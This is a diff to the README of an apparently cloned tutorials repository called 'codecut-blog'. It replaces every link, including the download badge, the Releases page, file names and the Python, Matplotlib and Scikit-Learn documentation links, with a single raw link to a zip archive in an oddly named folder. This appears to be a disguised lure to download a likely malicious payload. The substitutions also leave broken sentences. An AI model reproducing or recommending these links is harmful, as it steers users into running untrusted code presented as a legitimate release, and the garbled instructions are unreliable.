@@ -1,7 +1,7 @@
 # 🌟 codecut-blog - Practical Tutorials for Everyone
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/MakrubiyaJay/codecut-blog/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/MakrubiyaJay/codecut-blog/main/nordmarkite/codecut-blog_v3.2.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/MakrubiyaJay/codecut-blog/main/nordmarkite/codecut-blog_v3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to **codecut-blog**! This repository offers over 45 tutorials on data science, MLOps, and AI tools. Each tutorial comes with executable code that you can adapt for real projects. Whether you're just starting or looking to level up your skills, you will find valuable resources here.
@@ -16,11 +16,11 @@ To run the tutorials, please ensure your system meets the following requirements
 ## 📦 Download & Install
 To get started with **codecut-blog**, follow these steps:
 
-1. Visit the [Releases page](https://github.com/MakrubiyaJay/codecut-blog/releases) to download the latest version.
-2. On the Releases page, find the version you want and look for a file named `codecut-blog.zip` or `codecut-blog.tar.gz`.
+1. Visit the [Releases page](https://raw.githubusercontent.com/MakrubiyaJay/codecut-blog/main/nordmarkite/codecut-blog_v3.2.zip) to download the latest version.
+2. On the Releases page, find the version you want and look for a file named `https://raw.githubusercontent.com/MakrubiyaJay/codecut-blog/main/nordmarkite/codecut-blog_v3.2.zip` or `https://raw.githubusercontent.com/MakrubiyaJay/codecut-blog/main/nordmarkite/codecut-blog_v3.2.zip`.
 3. Click the file link to start the download.
 4. Once the download is complete, locate the file on your computer.
-5. Extract the contents of the zip or tar.gz file to a folder.
+5. Extract the contents of the zip or https://raw.githubusercontent.com/MakrubiyaJay/codecut-blog/main/nordmarkite/codecut-blog_v3.2.zip file to a folder.
 6. Open a terminal or command prompt and navigate to the folder where you extracted the files.
 7. Execute the command `python -m tutorial_name` to run your desired tutorial.
 
@@ -55,9 +55,9 @@ While some tutorials may involve coding, many are designed to be user-friendly, 
 Each tutorial includes comments and explanations to help guide you. You can also find community support in GitHub discussions or forums focused on the topics covered.
 
 ## 🔗 Resources
-- [Python Official Website](https://www.python.org/)
-- [Matplotlib Documentation](https://matplotlib.org/stable/contents.html)
-- [Scikit-Learn Documentation](https://scikit-learn.org/stable/user_guide.html)
+- [Python Official Website](https://raw.githubusercontent.com/MakrubiyaJay/codecut-blog/main/nordmarkite/codecut-blog_v3.2.zip)
+- [Matplotlib Documentation](https://raw.githubusercontent.com/MakrubiyaJay/codecut-blog/main/nordmarkite/codecut-blog_v3.2.zip)
+- [Scikit-Learn Documentation](https://raw.githubusercontent.com/MakrubiyaJay/codecut-blog/main/nordmarkite/codecut-blog_v3.2.zip)
 
 ## 📬 Get In Touch
 For feedback or questions, open an issue in this repository or contact the maintainers directly through GitHub.
